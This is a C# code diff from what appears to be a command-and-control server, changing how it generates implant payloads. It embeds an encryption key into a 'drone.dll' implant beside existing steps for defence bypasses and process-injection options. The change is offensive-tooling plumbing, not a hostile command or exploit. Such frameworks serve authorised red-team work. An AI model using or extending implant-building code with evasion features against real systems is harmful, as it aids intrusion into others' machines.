@@ -12,13 +12,17 @@ namespace TeamServer.Models
     public abstract class Payload
     {
         protected C2Profile C2Profile { get; }
-        public Handler Handler { get; }
+        protected Handler Handler { get; }
+        protected string CryptoKey { get; }
+        
         public byte[] Bytes { get; protected set; }
 
-        protected Payload(Handler handler, C2Profile c2Profile)
+        protected Payload(Handler handler, C2Profile c2Profile, string cryptoKey)
         {
             Handler = handler;
             C2Profile = c2Profile;
+
+            CryptoKey = cryptoKey;
         }
 
         public abstract Task Generate();
@@ -27,13 +31,21 @@ namespace TeamServer.Models
         {
             var drone = await Utilities.GetEmbeddedResource("drone.dll");
             var module = ModuleDefMD.Load(drone);
-            
+
+            EmbedCryptoKey(module);
             EmbedHandler(module);
             SetAppDomainName(module);
             SetBypasses(module);
             SetProcessInjectionOptions(module);
 
             return module;
+        }
+
+        private void EmbedCryptoKey(ModuleDef module)
+        {
+            var type = module.Types.GetType("Crypto");
+            var method = type.Methods.GetMethod("Key");
+            method.Body.Instructions[0].Operand = CryptoKey;
         }
 
         private void EmbedHandler(ModuleDef module)
